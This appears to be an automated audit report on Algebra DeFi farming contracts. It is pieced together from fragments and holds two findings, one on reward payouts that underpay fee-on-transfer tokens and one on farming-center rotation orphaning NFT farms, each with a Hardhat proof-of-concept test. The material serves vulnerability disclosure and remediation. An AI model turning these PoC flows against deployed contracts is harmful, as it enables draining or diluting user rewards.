   /// @dev BasePluginV1Factory was not developed for custom pool hooks. This implementation exists only to satisfy
   /// the updated IAlgebraPluginFactory interface, which includes hook methods for custom pool logic.
   function afterCreatePoolHook(address, address, address) external pure override {
     revert('Hooks not supported');
   }
 
   /// @inheritdoc IBasePluginV1Factory
   function createPluginForExistingPool(address token0, address token1) external override returns (address) {
     IAlgebraFactory factory = IAlgebraFactory(algebraFactory);
     require(factory.hasRoleOrOwner(factory.POOLS_ADMINISTRATOR_ROLE(), msg.sender));
 
     address pool = factory.poolByPair(token0, token1);
     require(pool != address(0), 'Pool not exist');
 
     return _createPlugin(pool);
   }
 
   function _createPlugin(address pool) internal returns (address) {
     require(pluginByPool[pool] == address(0), 'Already created');
     IAlgebraBasePluginV1 volatilityOracle = IAlgebraBasePluginV1(address(new BeaconProxy(address(this), '')));
     volatilityOracle.initialize(pool, algebraFactory, address(this));
     volatilityOracle.changeFeeConfiguration(defaultFeeConfiguration);
     pluginByPool[pool] = address(volatilityOracle);
     return address(volatilityOracle);
   }
 
   /// @inheritdoc IBasePluginV1Factory
   function setDefaultFeeConfiguration(AlgebraFeeConfiguration calldata newConfig) external override onlyAdministrator {
     AdaptiveFee.validateFeeConfiguration(newConfig);
     defaultFeeConfiguration = newConfig;
     emit DefaultFeeConfiguration(newConfig);
   }
 
   /// @inheritdoc IBasePluginV1Factory
   function setFarmingAddress(address newFarmingAddress) external override onlyAdministrator {
     require(farmingAddress != newFarmingAddress);
     farmingAddress = newFarmingAddress;
     emit FarmingAddress(newFarmingAddress);
   }
 
   /**
    * @dev Upgrades the beacon to a new implementation.
    *
    * Emits an {Upgraded} event.
    *
    * Requirements:
    *
    * - msg.sender must be the plugin adminisrator.
    * - `newImplementation` must be a contract.
    */
   function upgradeTo(address newImplementation) external onlyAdministrator {
     _setImplementation(newImplementation);
   }
 
   /**
    * @dev Sets the implementation contract address for this beacon
    *
    * Requirements:
    *
    * - `newImplementation` must be a contract.
    */
   function _setImplementation(address newImplementation) private {
     if (newImplementation.code.length == 0) {
       revert BeaconInvalidImplementation(newImplementation);
     }
+    try IAlgebraBasePluginV1(newImplementation).pluginImplementationId() returns (bytes32 implementationId) {
+      if (implementationId != keccak256('ALGEBRA_BASE_PLUGIN_V1')) revert BeaconInvalidImplementation(newImplementation);
+    } catch {
+      revert BeaconInvalidImplementation(newImplementation);
+    }
     implementation = newImplementation;
     emit Upgraded(newImplementation);
   }
 }

 /// @title Algebra custom pool plugin factory
 /// @dev This contract is an edited copy of BasePluginV1Factory created for custom pools logic.
 /// @notice Entry point for custom pool creation and custom pool plugin deployment.
 contract CustomPoolPluginFactory is ICustomPoolPluginFactory, AccessControlEnumerableUpgradeable, Ownable2StepUpgradeable {
   /// @notice Role that can deploy custom pools when public creation mode is disabled.
   bytes32 public constant override CUSTOM_POOL_DEPLOYER = keccak256('CUSTOM_POOL_DEPLOYER');
 
   /// @notice Algebra factory used for custom pool deployment.
   address public override factory;
 
   /// @notice Algebra custom pool entry point used to create and manage custom pools.
   address public override algebraCustomPoolEntryPoint;
 
   /// @notice Whether custom pool creation is public.
   bool public override isPublicPoolCreationMode;
 
   /// @notice Current default dynamic fee configuration for newly created plugins.
   AlgebraFeeConfiguration public override defaultFeeConfiguration;
 
   /// @inheritdoc IBeacon
   address public override implementation;
 
   /// @notice Plugin created for each custom pool.
   mapping(address pool => address plugin) public override pluginByPool;
 
   /// @notice Whether a token can be used for custom pool creation.
   mapping(address token => bool allowed) public override isWhitelistedToken;
 
   /// @notice Whether a pool was created through this factory.
   mapping(address pool => bool allowed) public override isCustomPool;
 
   struct PendingCustomPool {
     address creator;
     address token0;
     address token1;
     address plugin;
     bytes32 dataHash;
   }
 
   mapping(address pool => PendingCustomPool pendingCustomPool) private _pendingCustomPoolByAddress;
 
   constructor() {
     _disableInitializers();
   }
 
   function initialize(address _factory, address _algebraCustomPoolEntryPoint, address _pluginImplementation) external initializer {
     require(_factory != address(0));
     require(_algebraCustomPoolEntryPoint != address(0));
 
     __AccessControlEnumerable_init();
     __Ownable2Step_init();
 
     factory = _factory;
     algebraCustomPoolEntryPoint = _algebraCustomPoolEntryPoint;
     defaultFeeConfiguration = AdaptiveFee.initialFeeConfiguration();
 
     _grantRole(DEFAULT_ADMIN_ROLE, msg.sender);
     _grantRole(CUSTOM_POOL_DEPLOYER, msg.sender);
     _setImplementation(_pluginImplementation);
 
     emit DefaultFeeConfiguration(defaultFeeConfiguration);
   }
 
   /// @notice Deploys a custom pool with a newly created default plugin.

     require(isWhitelistedToken[tokenA], 'TokenA not whitelisted');
     require(isWhitelistedToken[tokenB], 'TokenB not whitelisted');
 
     (address token0, address token1) = _sortTokens(tokenA, tokenB);
     address expectedPool = IAlgebraFactory(factory).computeCustomPoolAddress(address(this), token0, token1);
     require(_pendingCustomPoolByAddress[expectedPool].creator == address(0), 'Pool creation pending');

     });
 
     customPool = IAlgebraCustomPoolEntryPoint(algebraCustomPoolEntryPoint).createCustomPool(address(this), msg.sender, tokenA, tokenB, data);
     require(customPool == expectedPool, 'Invalid custom pool');
```

# Nominal reward payouts can irreversibly underpay claims
**#214922**
- Severity: High
- Validity: Unreviewed
## Source locations
### `src/farming/contracts/farmings/AlgebraEternalFarming.sol` (3 locations)
#### Lines 186-202 — _Administrator accounting is reduced by capped nominal amounts before unchecked outbound token transfers._

```
  function decreaseRewardsAmount(IncentiveKey memory key, uint128 rewardAmount, uint128 bonusRewardAmount) external override onlyAdministrator {
    (bytes32 incentiveId, Incentive storage incentive) = _getExistingIncentiveByKey(key);
    IAlgebraEternalVirtualPool virtualPool = IAlgebraEternalVirtualPool(incentive.virtualPoolAddress);

    _distributeRewards(virtualPool);
    (uint128 rewardReserve0, uint128 rewardReserve1) = virtualPool.rewardReserves();
    if (rewardAmount > rewardReserve0) rewardAmount = rewardReserve0;
    if (rewardAmount >= incentive.totalReward) rewardAmount = incentive.totalReward - 1; // to not trigger 'non-existent incentive'
    incentive.totalReward = incentive.totalReward - rewardAmount;

    if (bonusRewardAmount > rewardReserve1) bonusRewardAmount = rewardReserve1;
    incentive.bonusReward = incentive.bonusReward - bonusRewardAmount;

    virtualPool.decreaseRewards(rewardAmount, bonusRewardAmount);

    if (rewardAmount > 0) TransferHelper.safeTransfer(address(key.rewardToken), msg.sender, rewardAmount);
    if (bonusRewardAmount > 0) TransferHelper.safeTransfer(address(key.bonusRewardToken), msg.sender, bonusRewardAmount);
```

#### Lines 407-434 — _Inbound receipts are explicitly measured, demonstrating the missing counterpart in outbound accounting._ — _Funding explicitly measures balanceBefore/balanceAfter, demonstrating the missing payout-side reconciliation._

```
  function _receiveRewards(
    IncentiveKey memory key,
    uint128 reward,
    uint128 bonusReward,
    Incentive storage incentive
  ) internal returns (uint128 receivedReward, uint128 receivedBonusReward) {
    if (!unlocked) revert reentrancyLock();
    unlocked = false; // reentrancy lock
    if (reward > 0) receivedReward = _receiveToken(key.rewardToken, reward);
    if (bonusReward > 0) receivedBonusReward = _receiveToken(key.bonusRewardToken, bonusReward);
    unlocked = true;

    (uint128 _totalRewardBefore, uint128 _bonusRewardBefore) = (incentive.totalReward, incentive.bonusReward);
    incentive.totalReward = _totalRewardBefore + receivedReward;
    incentive.bonusReward = _bonusRewardBefore + receivedBonusReward;
  }

  function _receiveToken(IERC20Minimal token, uint128 amount) private returns (uint128) {
    uint256 balanceBefore = _getBalanceOf(token);
    TransferHelper.safeTransferFrom(address(token), msg.sender, address(this), amount);
    uint256 balanceAfter = _getBalanceOf(token);
    require(balanceAfter > balanceBefore);
    unchecked {
      uint256 received = balanceAfter - balanceBefore;
      if (received > type(uint128).max) revert invalidTokenAmount();
      return (uint128(received));
    }
  }
```

### `src/periphery/contracts/libraries/TransferHelper.sol`
#### Lines 32-39 — _safeTransfer checks call success/return value only, not transferred balances._

```
    function safeTransfer(
        address token,
        address to,
        uint256 value
    ) internal {
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(IERC20.transfer.selector, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'ST');
    }
```
## Description

The reward payout paths treat a successful `TransferHelper.safeTransfer` call as proof that the nominal amount was transferred. In `_claimReward`, `rewards[from][rewardToken]` is reduced by `amountRequested` before the transfer, but neither the recipient's balance increase nor an exact-transfer property is verified. Consequently, a fee-on-transfer token can deliver less than the ledger debit, while a token that reports success without moving tokens can consume the entire claim. `decreaseRewardsAmount` applies the same nominal-accounting assumption when it reduces incentive and virtual-pool reserves before transferring reward tokens to the administrator. This differs from `_receiveToken`, which explicitly measures the inbound balance delta before crediting reward accounting.
## Root cause

Outbound reward accounting relies on `safeTransfer` call success rather than enforcing that the nominal amount is actually transferred before finalizing ledger and reserve debits.
## Impact

For a reward token with non-exact outbound transfer behavior, claimants can permanently forfeit part or all of their recorded reward while receiving less than the debited `amountRequested`, potentially including zero. Nominal reserve withdrawals can likewise make reserve accounting diverge from token custody and leave insufficient funds for remaining reward obligations.
## Proof of concept
### Test case

```
import { loadFixture } from '@nomicfoundation/hardhat-network-helpers';
import { ethers } from 'hardhat';
import { Wallet, MaxUint256 } from 'ethers';

import { algebraFixture, blockTimestamp, expect, FeeAmount, getMinTick, getMaxTick, TICK_SPACINGS, makeTimestamps, BNe18 } from './shared';
import { createTimeMachine } from './shared/time';
import { ActorFixture } from './shared/actors';
import { HelperCommands } from './helpers';
import { TestERC20 } from '../typechain';

describe('PoC: nominal reward accounting underpays non-exact reward tokens', () => {
  it('debits the full reward ledger even when a successful reward token transfer delivers less', async () => {
    const context = await loadFixture(algebraFixture);
    const wallets = (await ethers.getSigners()) as any as Wallet[];
    const actors = new ActorFixture(wallets, ethers.provider);
    const helpers = HelperCommands.fromTestContext(context, actors, ethers.provider);
    const Time = createTimeMachine();

    const lp = actors.lpUser0();
    const incentiveCreator = actors.incentiveCreator();
    const totalReward = 10_000n;
    const bonusReward = 200n;
    const amountDesired = BNe18(10);

    const tokenFactory = await ethers.getContractFactory('TestERC20');
    const feeOnTransferRewardToken = (await tokenFactory.deploy(MaxUint256 / 2n)) as any as TestERC20;

    // Fund the incentive maker before enabling deflation. With setDefl(true, 0),
    // TestERC20.transferFrom used by createEternalFarming is exact, while
    // TestERC20.transfer used by AlgebraEternalFarming._claimReward delivers less
    // than the nominal amount and still returns true.
    await feeOnTransferRewardToken.transfer(incentiveCreator.address, totalReward);
    await feeOnTransferRewardToken.setDefl(true, 0);

    const localNonce = await context.eternalFarming.numOfIncentives();
    const incentive = await helpers.createIncentiveFlow({
      rewardToken: feeOnTransferRewardToken,
      bonusRewardToken: context.bonusRewardToken,
      totalReward,
      bonusReward,
      poolAddress: await context.poolObj.getAddress(),
      nonce: localNonce,
      rewardRate: 10n,
      bonusRewardRate: 50n,
    });

    const timestamps = makeTimestamps(await blockTimestamp());
    await Time.setAndMine(timestamps.startTime + 1);

    const mintResult = await helpers.mintDepositFarmFlow({
      lp,
      tokensToFarm: [context.token0, context.token1],
      ticks: [getMinTick(TICK_SPACINGS[FeeAmount.MEDIUM]), getMaxTick(TICK_SPACINGS[FeeAmount.MEDIUM])],
      amountsToFarm: [amountDesired, amountDesired],
      createIncentiveResult: incentive,
    });

    await Time.setAndMine(timestamps.endTime + 10);

    const incentiveKey = {
      rewardToken: await feeOnTransferRewardToken.getAddress(),
      bonusRewardToken: await context.bonusRewardToken.getAddress(),
      pool: await context.poolObj.getAddress(),
      nonce: localNonce,
    };

    // Public FarmingCenter exit accrues the reward into AlgebraEternalFarming.rewards.
    await context.farmingCenter.connect(lp).exitFarming(incentiveKey, mintResult.tokenId);

    const claimableBefore = await context.eternalFarming.rewards(lp.address, await feeOnTransferRewardToken.getAddress());
    expect(claimableBefore).to.be.gt(0n);

    const recipientBalanceBefore = await feeOnTransferRewardToken.balanceOf(lp.address);
    await expect(context.eternalFarming.connect(lp).claimReward(feeOnTransferRewardToken, lp.address, 0n))
      .to.emit(context.eternalFarming, 'RewardClaimed')
      .withArgs(lp.address, claimableBefore, await feeOnTransferRewardToken.getAddress(), lp.address);
    const recipientBalanceAfter = await feeOnTransferRewardToken.balanceOf(lp.address);

    const actuallyReceived = recipientBalanceAfter - recipientBalanceBefore;
    const remainingLedger = await context.eternalFarming.rewards(lp.address, await feeOnTransferRewardToken.getAddress());

    // The vulnerable contract finalizes the nominal ledger debit and emits the
    // nominal payout, even though the recipient did not receive that amount.
    // A safe implementation that reverts or preserves the shortfall would not
    // satisfy these assertions.
    expect(remainingLedger).to.equal(0n);
    expect(actuallyReceived).to.be.gt(0n);
    expect(actuallyReceived).to.be.lt(claimableBefore);
  });
});
```

### Considerations

PoC demonstrates the user claim path through the real deployed AlgebraEternalFarming.claimReward/_claimReward code on the farming Hardhat harness. It uses the repository's TestERC20 configured so inbound transferFrom funding is exact while outbound transfer returns true but delivers less, then asserts the reward ledger is zeroed while the claimant balance delta is below the claimed amount. The PoC does not separately exercise decreaseRewardsAmount, but that path uses the same unchecked outbound TransferHelper.safeTransfer pattern after nominal reserve debits.
### Validation reasoning

PoC validation command completed successfully.
## Remediation
### Explanation

Route both claimant payouts and administrator reserve withdrawals through a shared exact-transfer helper that measures the recipient balance delta and reverts unless it equals the nominal debit; a revert rolls back all preceding ledger and reserve changes.
### Patch

```diff
diff --git a/src/farming/contracts/farmings/AlgebraEternalFarming.sol b/src/farming/contracts/farmings/AlgebraEternalFarming.sol
--- a/src/farming/contracts/farmings/AlgebraEternalFarming.sol
+++ b/src/farming/contracts/farmings/AlgebraEternalFarming.sol
@@ -1,499 +1,506 @@
 // SPDX-License-Identifier: BUSL-1.1
 pragma solidity =0.8.20;
 
 import '@cryptoalgebra/integral-core/contracts/interfaces/IAlgebraPoolDeployer.sol';
 import '@cryptoalgebra/integral-core/contracts/interfaces/IAlgebraPool.sol';
 import '@cryptoalgebra/integral-core/contracts/interfaces/IAlgebraFactory.sol';
 import '@cryptoalgebra/integral-core/contracts/interfaces/IERC20Minimal.sol';
 import '@cryptoalgebra/integral-core/contracts/libraries/SafeCast.sol';
 import '@cryptoalgebra/integral-core/contracts/libraries/FullMath.sol';
 import '@cryptoalgebra/integral-core/contracts/libraries/Constants.sol';
 import '@cryptoalgebra/integral-core/contracts/libraries/TickMath.sol';
 import '@cryptoalgebra/integral-core/contracts/libraries/LowGasSafeMath.sol';
 
 import '@cryptoalgebra/integral-periphery/contracts/libraries/TransferHelper.sol';
 
 import '@cryptoalgebra/integral-base-plugin/contracts/interfaces/plugins/IFarmingPlugin.sol';
 
 import '../interfaces/IAlgebraEternalFarming.sol';
 import '../interfaces/IAlgebraEternalVirtualPool.sol';
 import '../interfaces/IFarmingCenter.sol';
 import '../libraries/IncentiveId.sol';
 import '../libraries/NFTPositionInfo.sol';
 
 import './EternalVirtualPool.sol';
 
 /// @title Algebra Integral 1.0  eternal (v2-like) farming
 /// @notice Manages rewards and virtual pools
 contract AlgebraEternalFarming is IAlgebraEternalFarming {
   using SafeCast for int256;
   using LowGasSafeMath for uint256;
   using LowGasSafeMath for uint128;
 
   /// @notice Represents a farming incentive
   struct Incentive {
     uint128 totalReward;
     uint128 bonusReward;
     address virtualPoolAddress;
     uint24 minimalPositionWidth;
     bool deactivated;
     address pluginAddress;
   }
 
   /// @notice Represents the farm for nft
   struct Farm {
     uint128 liquidity;
     int24 tickLower;
     int24 tickUpper;
     uint256 innerRewardGrowth0;
     uint256 innerRewardGrowth1;
   }
 
   /// @inheritdoc IAlgebraEternalFarming
   bytes32 public constant override INCENTIVE_MAKER_ROLE = keccak256('INCENTIVE_MAKER_ROLE');
   /// @inheritdoc IAlgebraEternalFarming
   bytes32 public constant override FARMINGS_ADMINISTRATOR_ROLE = keccak256('FARMINGS_ADMINISTRATOR_ROLE');
 
   /// @inheritdoc IAlgebraEternalFarming
   INonfungiblePositionManager public immutable override nonfungiblePositionManager;
 
   IAlgebraPoolDeployer private immutable deployer;
   IAlgebraFactory private immutable factory;
 
   /// @inheritdoc IAlgebraEternalFarming
   address public override farmingCenter;
 
   /// @inheritdoc IAlgebraEternalFarming
   bool public override isEmergencyWithdrawActivated;
 
   // reentrancy lock
   bool private unlocked = true;
 
   /// @dev bytes32 incentiveId refers to the return value of IncentiveId.compute
   /// @inheritdoc IAlgebraEternalFarming
   mapping(bytes32 incentiveId => Incentive incentive) public override incentives;
 
   /// @dev farms[tokenId][incentiveHash] => Farm
   /// @inheritdoc IAlgebraEternalFarming
   mapping(uint256 tokenId => mapping(bytes32 incentiveId => Farm farm)) public override farms;
 
   /// @inheritdoc IAlgebraEternalFarming
   uint256 public numOfIncentives;
 
   /// @dev rewards[owner][rewardToken] => uint256
   /// @inheritdoc IAlgebraEternalFarming
   mapping(address owner => mapping(IERC20Minimal rewardToken => uint256 rewardAmount)) public override rewards;
 
   modifier onlyIncentiveMaker() {
     _checkHasRole(INCENTIVE_MAKER_ROLE);
     _;
   }
 
   modifier onlyAdministrator() {
     _checkHasRole(FARMINGS_ADMINISTRATOR_ROLE);
     _;
   }
 
   modifier onlyFarmingCenter() {
     _checkIsFarmingCenter();
     _;
   }
 
   /// @param _deployer pool deployer contract address
   /// @param _nonfungiblePositionManager the NFT position manager contract address
   constructor(IAlgebraPoolDeployer _deployer, INonfungiblePositionManager _nonfungiblePositionManager) {
     (deployer, nonfungiblePositionManager) = (_deployer, _nonfungiblePositionManager);
     factory = IAlgebraFactory(_nonfungiblePositionManager.factory());
   }
 
   /// @inheritdoc IAlgebraEternalFarming
   function isIncentiveDeactivated(bytes32 incentiveId) external view override returns (bool res) {
     return _isIncentiveDeactivated(incentives[incentiveId]);
   }
 
   function _checkIsFarmingCenter() internal view {
     require(msg.sender == farmingCenter);
   }
 
   function _checkHasRole(bytes32 role) internal view {
     require(factory.hasRoleOrOwner(role, msg.sender));
   }
 
   /// @inheritdoc IAlgebraEternalFarming
   function createEternalFarming(
     IncentiveKey memory key,
     IncentiveParams memory params,
     address plugin
   ) external override onlyIncentiveMaker returns (address virtualPool) {
     address connectedPlugin = key.pool.plugin();
     if (connectedPlugin != plugin || connectedPlugin == address(0)) revert pluginNotConnected();
     if (IFarmingPlugin(connectedPlugin).incentive() != address(0)) revert anotherFarmingIsActive();
 
     virtualPool = address(new EternalVirtualPool(address(this), connectedPlugin));
     IFarmingCenter(farmingCenter).connectVirtualPoolToPlugin(virtualPool, IFarmingPlugin(connectedPlugin));
 
     key.nonce = numOfIncentives++;
     bytes32 incentiveId = IncentiveId.compute(key);
     Incentive storage newIncentive = incentives[incentiveId];
 
     (params.reward, params.bonusReward) = _receiveRewards(key, params.reward, params.bonusReward, newIncentive);
     if (params.reward == 0) revert zeroRewardAmount();
 
     unchecked {
       if (int256(uint256(params.minimalPositionWidth)) > (int256(TickMath.MAX_TICK) - int256(TickMath.MIN_TICK)))
         revert minimalPositionWidthTooWide();
     }
     newIncentive.virtualPoolAddress = virtualPool;
     newIncentive.minimalPositionWidth = params.minimalPositionWidth;
     newIncentive.pluginAddress = connectedPlugin;
 
     emit EternalFarmingCreated(
       key.rewardToken,
       key.bonusRewardToken,
       key.pool,
       virtualPool,
       key.nonce,
       params.reward,
       params.bonusReward,
       params.minimalPositionWidth
     );
 
     _addRewards(IAlgebraEternalVirtualPool(virtualPool), params.reward, params.bonusReward, incentiveId);
     _setRewardRates(IAlgebraEternalVirtualPool(virtualPool), params.rewardRate, params.bonusRewardRate, incentiveId);
   }
 
   /// @inheritdoc IAlgebraEternalFarming
   function deactivateIncentive(IncentiveKey memory key) external override onlyIncentiveMaker {
     (bytes32 incentiveId, Incentive storage incentive) = _getExistingIncentiveByKey(key);
     // if the virtual pool is deactivated automatically, it is still possible to correctly deactivate it manually
     if (incentive.deactivated) revert incentiveStopped();
 
     IAlgebraEternalVirtualPool virtualPool = IAlgebraEternalVirtualPool(incentive.virtualPoolAddress);
     IFarmingPlugin plugin = IFarmingPlugin(incentive.pluginAddress);
 
     incentive.deactivated = true;
     virtualPool.deactivate();
 
     (uint128 rewardRate0, uint128 rewardRate1) = virtualPool.rewardRates();
```

```
      IncentiveKey memory key = incentiveKeys[_eternalIncentiveId];

      if (liquidity == 0 || virtualPoolAddresses[address(key.pool)] == address(0)) {
        _exitFarming(key, tokenId, tokenOwner); // nft burned or incentive deactivated, exit completely
      } else {
        IAlgebraEternalFarming(eternalFarming).exitFarming(key, tokenId, tokenOwner);

        if (
          IAlgebraEternalFarming(eternalFarming).isIncentiveDeactivated(IncentiveId.compute(key)) ||
          IAlgebraEternalFarming(eternalFarming).isEmergencyWithdrawActivated()
        ) {
          // exit completely if the incentive has stopped (manually or automatically) or there is emergency
          _switchFarmingStatusOff(tokenId);
        } else {
          // reenter with new liquidity value
          IAlgebraEternalFarming(eternalFarming).enterFarming(key, tokenId);
        }
      }
    }
```

```
  function enterFarming(IncentiveKey memory key, uint256 tokenId) external override onlyFarmingCenter {
    if (isEmergencyWithdrawActivated) revert emergencyActivated();
    (bytes32 incentiveId, int24 tickLower, int24 tickUpper, uint128 liquidity, address virtualPoolAddress) = _enterFarming(key, tokenId);

    IAlgebraEternalVirtualPool virtualPool = IAlgebraEternalVirtualPool(virtualPoolAddress);
    (uint256 innerRewardGrowth0, uint256 innerRewardGrowth1) = _getInnerRewardsGrowth(virtualPool, tickLower, tickUpper);

    farms[tokenId][incentiveId] = Farm(liquidity, tickLower, tickUpper, innerRewardGrowth0, innerRewardGrowth1);

  /// @inheritdoc IAlgebraEternalFarming
  function exitFarming(IncentiveKey memory key, uint256 tokenId, address _owner) external override onlyFarmingCenter {
    bytes32 incentiveId = IncentiveId.compute(key);
    Farm memory farm = _getFarm(tokenId, incentiveId);

    uint256 reward;
    uint256 bonusReward;
    if (!isEmergencyWithdrawActivated) {
      (reward, bonusReward) = _updatePosition(farm, key, incentiveId, _owner, -int256(uint256(farm.liquidity)).toInt128());
    }

    delete farms[tokenId][incentiveId];

    emit FarmEnded(tokenId, incentiveId, address(key.rewardToken), address(key.bonusRewardToken), _owner, reward, bonusReward);
  }
```

## Description

The NonfungiblePositionManager stores a single replaceable `farmingCenter` pointer, but active farm state is spread across three independent places: the manager's per-token `farmingApprovals`/`tokenFarmedIn`, each FarmingCenter's own `deposits`/`incentiveKeys` mappings, and the `AlgebraEternalFarming` engine's `farms[tokenId][incentiveId]` records. When `setFarmingCenter` is called, only the manager's global pointer is changed; existing `tokenFarmedIn` and `farmingApprovals` entries are left unchanged, and neither the old center's deposits nor the engine farm records are migrated or closed. Afterwards, `_applyLiquidityDeltaInFarming` silently skips the callback whenever `tokenFarmedIn[tokenId] != farmingCenter`, so the old center's farms stop receiving liquidity updates. Because the new center's `deposits` mapping is empty, it can `enterFarming` the same NFT into a (possibly different) incentive, and `switchFarmingStatus(toActive=true)` overwrites the single `tokenFarmedIn` marker with the new center, orphaning the old association. `burn` also deletes `tokenFarmedIn` while the old center's deposit and engine farm remain. The engine's `setFarmingCenterAddress` changes the engine's trusted center independently, so the old center can no longer call `exitFarming` after the engine pointer is updated. Together this produces duplicate/stale farm records, reward dilution, and blocked normal exits.
## Root cause

The manager and engine treat `farmingCenter` as a replaceable global pointer while active farm state is center-local, with no migration, settlement, or single-membership invariant enforced on replacement.
## Impact

After a center rotation an NFT can be entered in multiple incentives, old farms can remain credited at stale liquidity in virtual pools, reward growth is diluted across duplicated or stale liquidity, and users may be unable to exit through the normal center-authorized path. Burn can strand rewards and leave active engine farm records with no owning NFT.
## Proof of concept
### Test case

```
import { loadFixture } from '@nomicfoundation/hardhat-network-helpers';
import { ethers } from 'hardhat';

import { algebraFixture, blockTimestamp, expect, BNe18, getMaxTick, getMinTick, FeeAmount, maxGas } from './shared';
import { HelperCommands, incentiveResultToFarmAdapter } from './helpers';
import { ActorFixture } from './shared/actors';
import { provider } from './shared/provider';

describe('PoC: farming-center replacement orphans active NFT farms', () => {
  it('keeps an old center farm live while a replacement center farms, exits, and burns the same NFT', async () => {
    const context = await loadFixture(algebraFixture);
    const wallets = await ethers.getSigners();
    const actors = new ActorFixture(wallets as any, provider);
    const helpers = HelperCommands.fromTestContext(context, actors, provider);
    const lp = actors.lpUser0();
    const incentiveCreator = actors.incentiveCreator();

    const amountDesired = BNe18(10);
    const rewardAmount = 10_000n;
    const bonusRewardAmount = 1_000n;

    const firstIncentive = await helpers.createIncentiveFlow({
      rewardToken: context.rewardToken,
      bonusRewardToken: context.bonusRewardToken,
      poolAddress: context.pool01,
      nonce: 0n,
      totalReward: rewardAmount,
      bonusReward: bonusRewardAmount,
      rewardRate: 1n,
      bonusRewardRate: 1n,
      minimalPositionWidth: 0,
    });
    const firstKey = await incentiveResultToFarmAdapter(firstIncentive);
    const firstIncentiveId = await helpers.getIncentiveId(firstIncentive);

    const farmed = await helpers.mintDepositFarmFlow({
      lp,
      tokensToFarm: [context.token0, context.token1],
      amountsToFarm: [amountDesired, amountDesired],
      ticks: [getMinTick(FeeAmount.MEDIUM), getMaxTick(FeeAmount.MEDIUM)],
      createIncentiveResult: firstIncentive,
    });
    const tokenId = farmed.tokenId;
    const oldCenterAddress = await context.farmingCenter.getAddress();

    expect(await context.farmingCenter.deposits(tokenId)).to.equal(firstIncentiveId);
    expect(await context.nft.tokenFarmedIn(tokenId)).to.equal(oldCenterAddress);
    const firstFarmBeforeRotation = await context.eternalFarming.farms(tokenId, firstIncentiveId);
    expect(firstFarmBeforeRotation.liquidity).to.be.gt(0n);

    const farmingCenterFactory = await ethers.getContractFactory('FarmingCenter', actors.farmingDeployer());
    const replacementCenter = await farmingCenterFactory.deploy(context.eternalFarming, context.nft);
    const replacementCenterAddress = await replacementCenter.getAddress();

    await context.nft.connect(context.ownerSigner).setFarmingCenter(replacementCenterAddress);
    await context.pluginFactory.connect(context.ownerSigner).setFarmingAddress(replacementCenterAddress);
    await context.eternalFarming.connect(context.ownerSigner).setFarmingCenterAddress(replacementCenterAddress);

    // The old center association is retained, but NPM callbacks now target only the replacement center.
    expect(await context.nft.farmingCenter()).to.equal(replacementCenterAddress);
    expect(await context.nft.tokenFarmedIn(tokenId)).to.equal(oldCenterAddress);

    const positionBeforeSkippedUpdate = await context.nft.positions(tokenId);
    const halfLiquidity = positionBeforeSkippedUpdate.liquidity / 2n;
    await context.nft.connect(lp).decreaseLiquidity(
      {
        tokenId,
        liquidity: halfLiquidity,
        amount0Min: 0,
        amount1Min: 0,
        deadline: (await blockTimestamp()) + 1_000,
      },
      maxGas
    );

    // Because tokenFarmedIn is C1 while farmingCenter is C2, the decrease skipped C1.applyLiquidityDelta.
    const positionAfterSkippedUpdate = await context.nft.positions(tokenId);
    expect(positionAfterSkippedUpdate.liquidity).to.be.lt(firstFarmBeforeRotation.liquidity);
    const firstFarmAfterSkippedUpdate = await context.eternalFarming.farms(tokenId, firstIncentiveId);
    expect(firstFarmAfterSkippedUpdate.liquidity).to.equal(firstFarmBeforeRotation.liquidity);
    expect(await context.farmingCenter.deposits(tokenId)).to.equal(firstIncentiveId);

    // Make the pool available for a second incentive. This does not settle or delete the first farm record.
    await context.eternalFarming.connect(incentiveCreator).deactivateIncentive(firstKey);

    const secondIncentive = await helpers.createIncentiveFlow({
      rewardToken: context.rewardToken,
      bonusRewardToken: context.bonusRewardToken,
      poolAddress: context.pool01,
      nonce: 1n,
      totalReward: rewardAmount,
      bonusReward: bonusRewardAmount,
      rewardRate: 1n,
      bonusRewardRate: 1n,
      minimalPositionWidth: 0,
    });
    const secondKey = await incentiveResultToFarmAdapter(secondIncentive);
    const secondIncentiveId = await helpers.getIncentiveId(secondIncentive);

    await context.nft.connect(lp).approveForFarming(tokenId, true, replacementCenterAddress);
    await replacementCenter.connect(lp).enterFarming(secondKey, tokenId);

    // A replacement center with empty local deposits farms the same NFT into another incentive.
    expect(await context.farmingCenter.deposits(tokenId)).to.equal(firstIncentiveId);
    expect(await replacementCenter.deposits(tokenId)).to.equal(secondIncentiveId);
    expect(await context.nft.tokenFarmedIn(tokenId)).to.equal(replacementCenterAddress);

    const firstFarmWhileDuplicated = await context.eternalFarming.farms(tokenId, firstIncentiveId);
    const secondFarmWhileDuplicated = await context.eternalFarming.farms(tokenId, secondIncentiveId);
    expect(firstFarmWhileDuplicated.liquidity).to.equal(firstFarmBeforeRotation.liquidity);
    expect(secondFarmWhileDuplicated.liquidity).to.equal(positionAfterSkippedUpdate.liquidity);
    expect(firstFarmWhileDuplicated.liquidity + secondFarmWhileDuplicated.liquidity).to.be.gt(positionAfterSkippedUpdate.liquidity);

    // C2 receives the final liquidity callback and exits its own farm, but C1's stale deposit and engine farm survive.
    await context.nft.connect(lp).decreaseLiquidity(
      {
        tokenId,
        liquidity: positionAfterSkippedUpdate.liquidity,
        amount0Min: 0,
        amount1Min: 0,
        deadline: (await blockTimestamp()) + 1_000,
      },
      maxGas
    );
    const positionAfterFullDecrease = await context.nft.positions(tokenId);
    expect(positionAfterFullDecrease.liquidity).to.equal(0n);
    expect(await replacementCenter.deposits(tokenId)).to.equal(ethers.ZeroHash);
    const secondFarmAfterC2Exit = await context.eternalFarming.farms(tokenId, secondIncentiveId);
    expect(secondFarmAfterC2Exit.liquidity).to.equal(0n);

    const staleFirstFarmBeforeBurn = await context.eternalFarming.farms(tokenId, firstIncentiveId);
    expect(staleFirstFarmBeforeBurn.liquidity).to.equal(firstFarmBeforeRotation.liquidity);
    expect(await context.farmingCenter.deposits(tokenId)).to.equal(firstIncentiveId);

    const owedPosition = await context.nft.positions(tokenId);
    await context.nft.connect(lp).collect(
      {
        tokenId,
        recipient: lp.address,
        amount0Max: owedPosition.tokensOwed0,
        amount1Max: owedPosition.tokensOwed1,
      },
      maxGas
    );
    await context.nft.connect(lp).burn(tokenId, maxGas);

    expect(await context.farmingCenter.deposits(tokenId)).to.equal(firstIncentiveId);
